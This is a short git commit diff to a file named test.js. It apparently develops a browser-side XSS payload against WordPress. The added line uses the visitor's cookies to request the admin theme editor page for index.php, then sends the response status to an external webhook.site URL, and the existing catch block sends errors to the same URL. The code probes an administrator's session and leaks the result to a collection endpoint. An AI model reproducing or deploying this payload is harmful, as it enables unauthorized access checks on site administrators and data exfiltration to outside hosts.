f79165bcd02c31f04ac11d7423699d3953f6e7fc
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 12:24:58 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,7 @@
 try{
-  await fetch("http://localhost:1024/",{mode:'no-cors'});
+  //await fetch("http://localhost:1024/",{mode:'no-cors'});
+  var a = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.status}).then(status => {fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+status)});
+  
 }catch(err){
   fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err);
 }
